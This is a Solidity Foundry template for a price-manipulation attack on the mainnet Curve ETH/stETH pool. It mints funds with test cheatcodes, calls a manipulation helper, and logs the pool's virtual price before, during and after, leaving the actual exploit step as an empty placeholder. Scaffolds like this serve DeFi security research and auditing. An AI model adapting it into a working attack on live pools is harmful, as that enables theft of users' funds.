pragma solidity ^0.8.0;

import "./pricemanipulation/PriceManipulation.sol";
import "./tokens/Tokens.sol";

import "forge-std/console.sol";

contract PriceManipulationTemplate is PriceManipulation, Tokens {
    function initiateAttack() external {
        // Take flash loan on some token
        deal(EthereumTokens.NATIVE_ASSET, address(this), 50000e18);
        // Deal wstETH since forge deal cheatcode does not currently support stETH directly
        deal(EthereumTokens.wstETH, address(this), 50000e18);
        IWrapped(address(EthereumTokens.wstETH)).unwrap(50000e18);
        console.log("Virtual price before:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
        manipulatePrice(PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18);
        _completeAttack();
    }

    function _executeAttack() internal override {
        // Execute attack and use flash loaned funds here
        console.log("Virtual price during:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
    }

    function _completeAttack() internal override {
        // Finish attack
        console.log("Virtual price after :", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
    }
}

interface IPool {
    function get_virtual_price() external view returns (uint256);
}
interface IWrapped {
    function wrap(uint256) external;
    function unwrap(uint256) external;
}